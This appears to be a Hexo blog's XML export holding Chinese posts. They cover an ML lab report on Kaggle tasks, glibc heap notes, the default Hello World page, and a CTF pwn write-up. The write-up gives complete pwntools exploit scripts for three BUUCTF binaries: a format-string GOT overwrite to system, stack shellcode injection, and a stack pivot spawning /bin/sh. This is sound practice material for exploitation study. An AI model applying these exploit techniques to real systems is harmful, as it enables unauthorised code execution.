    <content><![CDATA[<h1 id="Task-3-2-进阶任务实验报告"><a href="#Task-3-2-进阶任务实验报告" class="headerlink" title="Task 3.2 进阶任务实验报告"></a>Task 3.2 进阶任务实验报告</h1><h2 id="Task-3-2-1-表格型数据的进阶任务"><a href="#Task-3-2-1-表格型数据的进阶任务" class="headerlink" title="Task 3.2.1 表格型数据的进阶任务"></a>Task 3.2.1 表格型数据的进阶任务</h2><h3 id="电影票房预测：TMDB-Box-Office-Prediction"><a href="#电影票房预测：TMDB-Box-Office-Prediction" class="headerlink" title="电影票房预测：TMDB Box Office Prediction"></a>电影票房预测：TMDB Box Office Prediction</h3><h4 id="原始特征"><a href="#原始特征" class="headerlink" title="原始特征"></a>原始特征</h4><p>poster-path、imdb-id特征一个是图片链接，一个是id，对模型没有任何直接关系，直接删去。</p>
<p>revenue和budget的分布比较不均匀，可以通过<code>np.log1p</code>进行平滑处理，这样的预测结果比较符合正态分布，预测准确度能够提高。</p>
<p>cast，crew，belongs-to-collection等特征是以json格式存储的，对数据中json的解析，<code>ast.literal_eval</code>能比较方便地完成解析任务。</p>
<h4 id="特征处理"><a href="#特征处理" class="headerlink" title="特征处理"></a>特征处理</h4><h4 id="人工构造特征"><a href="#人工构造特征" class="headerlink" title="人工构造特征"></a>人工构造特征</h4><h4 id="自动特征工程"><a href="#自动特征工程" class="headerlink" title="自动特征工程"></a>自动特征工程</h4><h4 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h4><h3 id="旧金山犯罪分类：San-Francisco-Crime-Classification"><a href="#旧金山犯罪分类：San-Francisco-Crime-Classification" class="headerlink" title="旧金山犯罪分类：San Francisco Crime Classification"></a>旧金山犯罪分类：San Francisco Crime Classification</h3><h4 id="原始特征-1"><a href="#原始特征-1" class="headerlink" title="原始特征"></a>原始特征</h4><h4 id="特征处理-1"><a href="#特征处理-1" class="headerlink" title="特征处理"></a>特征处理</h4><h4 id="人工构造特征-1"><a href="#人工构造特征-1" class="headerlink" title="人工构造特征"></a>人工构造特征</h4><p>对时间序列特征，提取出年、月、日、季度，星期等子特征。并使用onehot编码展开。</p>
<p>经纬度坐标中，在测试集发现经度为-120.5，纬度为90的异常特征，分别使用经纬度的中位数进行填补。</p>
<p>发现地址中具有规律，可根据地址最后两个字母的不同，构造特征。</p>
<p>使用随机森林进行回归，准确率为27.5%左右，有待提高。</p>
<h4 id="使用NNI"><a href="#使用NNI" class="headerlink" title="使用NNI"></a>使用NNI</h4><h4 id="最终结果-1"><a href="#最终结果-1" class="headerlink" title="最终结果"></a>最终结果</h4><p>使用LightGBM算法，在验证集上的结果是2.35，达到了top25%左右的水平。</p>
<p>在测试集上的结果是</p>
<h3 id="土壤属性预测：Africa-Soil-Property-Prediction-Challenge"><a href="#土壤属性预测：Africa-Soil-Property-Prediction-Challenge" class="headerlink" title="土壤属性预测：Africa Soil Property Prediction Challenge"></a>土壤属性预测：Africa Soil Property Prediction Challenge</h3><p>multi-label的回归任务其实可以拆分为多个单label的回归任务，通过多次构建模型进行回归来预测各个label的值。</p>
<h4 id="原始特征-2"><a href="#原始特征-2" class="headerlink" title="原始特征"></a>原始特征</h4><p>原始特征均进行过标准化处理，除了<code>Depth</code>特征可以将字符串变化为01编码，其他特征无需进一步处理。</p>
<h4 id="建立模型"><a href="#建立模型" class="headerlink" title="建立模型"></a>建立模型</h4><p>使用了sklearn中贝叶斯线性回归模型（BayesianRidge），最终loss为0.46489，拟合效果很好。</p>
<h2 id="Task-3-2-2-复杂型数据的探究任务"><a href="#Task-3-2-2-复杂型数据的探究任务" class="headerlink" title="Task 3.2.2 复杂型数据的探究任务"></a>Task 3.2.2 复杂型数据的探究任务</h2>]]></content>
  </entry>
  <entry>
    <title>Writeup for Second Week</title>
    <url>/2021/01/22/Writeup-for-Second-Week/</url>
    <content><![CDATA[<h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a>axb_2019_fmt32</h2><p>32位格式化字符串漏洞，有几个特点需要注意：</p>
<ol>
<li>测偏移的时候会发现没有完整四位四位的偏移，此时需要在最开始多补一位，这样保证后面都是从8的偏移开始。</li>
<li>用格式化字符串漏洞泄露libc的时候用<code>%s</code>，然后第一个4位是got.plt表上的地址，第二个4位才是真正的地址。</li>
<li><code>fmtstr_payload</code>填了四个参数，其中注意<code>numbwritten</code>参数，意思是格式化字符串中前面已有的字符数。0xa就是<code>Repeater:A</code>的位数。</li>
<li>最后劫持了<code>printf</code>的got表，填个分号做命令分割，就直接拿shell了。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="string">&#x27;26090&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &#x27;XAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> + p32(puts_got) + <span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Repeater:A&quot;</span>)</span><br><span class="line">puts_addr = p.recv(<span class="number">8</span>)[-<span class="number">4</span>:]</span><br><span class="line">puts_addr = u32(puts_addr)</span><br><span class="line">log.info(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="comment"># log.info(hex(system_addr))</span></span><br><span class="line"><span class="comment"># log.info(hex(binsh_addr))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> + fmtstr_payload(<span class="number">8</span>, &#123;printf_got: system_addr&#125;, write_size=<span class="string">&#x27;byte&#x27;</span>, numbwritten=<span class="number">0xa</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># 8</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>在当前栈空间外面写shellcode，gdb调出偏移，借助最开始泄露的地址写入shellcode在栈上的地址，就能跳转到栈上的shellcode。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, &#x27;28529&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Yippie, lets crash: &#x27;</span>)</span><br><span class="line">buf = p.recvline().strip()</span><br><span class="line">base_addr = <span class="built_in">int</span>(buf, <span class="number">16</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># print(len(shellcode))</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x16</span> - <span class="number">0x8</span> + <span class="number">0x4</span>) + p32(base_addr - <span class="number">0x1c</span>) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>0x28的栈溢出只能输入0x30，这时候要用到栈劫持，新的知识点。</p>
<p>大体思路就是先通过一个<code>leave</code>然后<code>ret</code>的gadget强行把栈缩小，然后我们就在当前部分的栈帧里去布置就可以了。</p>
<p>直接粘核心exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ebp_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">str_addr = ebp_addr - <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(str_addr + <span class="number">0x10</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(str_addr) + p32(leave_ret)</span><br></pre></td></tr></table></figure>
<p>这个payload的构造挺巧妙的，稍微分析下：</p>
<p>最后的0x8个字节用字符串起始地址覆盖了ebp，后面紧接着<code>leave</code>和<code>ret</code>，<code>leave</code>的时候直接调到字符串其实地址，<code>ret</code>的时候从<code>aaaa</code>跳到后面的system函数地址。system参数，同样是用在栈上写字符串的方法解决的。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/12/19/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>glibc Heap Learning</title>
    <url>/2021/01/16/glibc-Heap-Learning/</url>
    <content><![CDATA[<p>学了好几天的堆，今晚把已经看过的堆的知识记录一下。</p>
<h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>系统用堆(Heap)来动态管理内存，堆从低地址向高地址生长。</p>
<p>一直听到堆栈的说法，其实堆跟栈区别真的很大的好吧：比如栈从高地址向低地址生长，内存较为固定，地址一直是<code>0x7ffff...</code>开头的，不能跟堆混为一谈吧。</p>
<p>堆的实现就是时间与空间达到权衡(trade off)的生动案例。后面我们会体会到。</p>
<p>堆想要效率高，就应该提高单次分配和释放的速率，同时也要减少内存空间利用的碎片化。</p>
<p>glibc中堆的管理器是ptmalloc2。我们在pwn学堆的时候，就学习ptmalloc2的堆管理。</p>
<h2 id="堆的两个C语言高级函数"><a href="#堆的两个C语言高级函数" class="headerlink" title="堆的两个C语言高级函数"></a>堆的两个C语言高级函数</h2><p>在C++里面是<code>new</code>跟<code>delete</code>，而在C语言里面是<code>malloc</code>跟<code>free</code>。</p>
<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void* malloc(size_t n);</span><br><span class="line">return a pointer to the newly-allocated chunk.</span><br></pre></td></tr></table></figure>
<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void free(void* p);</span><br><span class="line">release the chunk pointed by the pointer p</span><br></pre></td></tr></table></figure>
<h2 id="堆底层的常用概念"><a href="#堆底层的常用概念" class="headerlink" title="堆底层的常用概念"></a>堆底层的常用概念</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>arena可以理解为一个区域内的内存集合，可以看作是一片连续的内存空间。</p>
<p>在多线程中，每个线程都有一个专属的arena，主线程的arena就叫<code>main_arena</code>，后续做题经常见到。</p>
<p>主线程的arena通过系统调用<code>sbrk</code>创建，通过<code>brk</code>进行伸缩，其他线程的arena通过<code>mmap</code>来创建。</p>
<p><code>main_arena</code>其实是由一个<code>struct malloc_state</code>来组织的，这个结构体里面储存了多种类型的bin和top chunk等内容。</p>
<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>chunk即是<code>malloc</code>和<code>free</code>操作时，内存块的基本单位。</p>
<h4 id="free-chunk的结构"><a href="#free-chunk的结构" class="headerlink" title="free chunk的结构"></a>free chunk的结构</h4><p>一个空闲的chunk不是都是unused area，而是在chunk的头部储存了很多信息，具体是这么储存的：</p>
<ul>
<li>prev_size：储存上一个chunk的size</li>
<li>size：储存当前free chunk的size</li>
<li>fd：下一个free chunk</li>
<li>bk：上一个free chunk</li>
<li>unused area</li>
</ul>
<p>另外，注意到x86-64平台下，chunk都是每8个字节对齐的，所以chunk的大小也一定是8个字节的倍数，所以上面用来表示size的8个字节，就可以保证二进制表示下最后必有3个0。</p>
<p>而这3个0的位置，就被设计来分别储存3个信息：</p>
<ul>
<li>N：NON_MAIN_ARENA，1表示不是main_arena的，0代表是main_arena的。</li>
<li>M：IS_MMAPPED，1代表该chunk是<code>mmap</code>出来的，0则不是。</li>
<li>P：PREV_INUSE，1代表前面的chunk正在被使用，0则代表前面的chunk是空闲的。</li>
</ul>
<h4 id="allocated-chunk的结构"><a href="#allocated-chunk的结构" class="headerlink" title="allocated chunk的结构"></a>allocated chunk的结构</h4><p>allocated chunk的结构跟free chunk大体相似，不过也有不同：</p>
<ul>
<li>prev_size、size、NMP这前两个字段都是跟free chunk一样的。</li>
<li>没有fd和bk，从第三个字段开始即可开始储存数据。</li>
</ul>
<p>注意一下，prev_size到底什么时候有必要？当可以与前面的chunk合并时有必要存在。</p>
<p>什么时候allocated chunk可以省去prev_size这一个字段的空间？当前面的chunk也是allocated的。</p>
<p>所以，在设计之中，allocated chunk之间是可以把prev_size那8个字节也用来存入数据，这样能多出8个字节的存储空间。</p>
<h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>top chunk就是一个arena里面最后的那块chunk，不管怎样都会存在，作为一个arena的结束，不输入任何一个bin。</p>
<p>top chunk可以通过系统调用<code>brk</code>来变长变短，也可以在<code>malloc</code>过程中被切出一块去用，但是一直会存在。</p>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>bin是用来管理<strong>空闲的chunk</strong>的一个数据结构，通过单向或双向链表来进行组织。</p>
<p>通过将不同类型的chunk放进不同的bin中进行管理，能够提高<code>malloc</code>过程找到合适的chunk的速率。</p>
<h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><p>fast bin维护小型的内存块，将这些小内存块用于系统频繁的小型内存申请调用。</p>
<p>fast bin只有1组，也就是只有一条单向链表来维护。</p>
<p>fast bin中的free chunk有这么几个特点：</p>
<ol>
<li>不与其他的free chunk合并</li>
<li>使用singly linked list进行组织</li>
<li>采用Last In First Out Policy</li>
<li>申请小内存时，最先在fast bin中寻找</li>
<li>当被free时，不会将P位置0（PREV_INUSE）</li>
</ol>
<p>一般0x20到0x7f大小的chunk，在free后并且分类后，会被丢进fast bin进行维护。</p>
<h4 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h4><p>small bins有62组链表，负责维护相对较小的chunk。</p>
<p>small bins的free chunk就跟fast bin不同了：</p>
<ol>
<li>相同大小的chunk就会被放在同一组small bin之中</li>
<li>使用doubly linked list维护</li>
<li>First In First Out</li>
<li>当被free时，会诚实地记录P位</li>
<li>并且，有条件时，会主动地合并成一个更大的free chunk</li>
</ol>
<p>大小从0x80到0x400的chunk最后会被丢到small bins去维护。（大小小于1M）</p>
<h4 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h4><p>large bins共有63组。每一组large bin储存的不是特定大小的chunk，而是大小处在一定范围的chunk。</p>
<p>记录的方法与small bin几乎相同。一样是FIFO，一样是双向链表，一样会主动合并。</p>
<p>不过有一点特殊：large bin中的chunk是按照从大到小进行排序的。</p>
<p>大于0x400即1M的chunk就会被安排到large bin里面去。</p>
<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>unsorted bin可以通俗想象成是chunk的“垃圾桶”，任何大于0x80的chunk都会被丢进unsorted bin里面去。（太小的直接丢进fast bin里面维护）</p>
<p>unsorted bin中的chunk没有大小规定，也没有大小顺序，一切都是待整理状态。</p>
<p>在里面的chunk会通过后续的“捡垃圾”（即chunk维护整理工作）进入到专属的chunk。</p>
<p>与fast bin一样，unsorted bin也只有一组。也只是一个暂存的缓冲区域，该挑合适的chunk，还是去规定的bin找，万不得已最后才来搜垃圾堆嘛。。。</p>
<h3 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h3><p>有一个原则：任意两个物理相邻的空闲chunk不能排在一起。（不过fast bin还是得除外的）</p>
<h2 id="堆的工作流程"><a href="#堆的工作流程" class="headerlink" title="堆的工作流程"></a>堆的工作流程</h2><h3 id="malloc的工作流程"><a href="#malloc的工作流程" class="headerlink" title="malloc的工作流程"></a>malloc的工作流程</h3><h3 id="free的工作流程"><a href="#free的工作流程" class="headerlink" title="free的工作流程"></a>free的工作流程</h3>]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
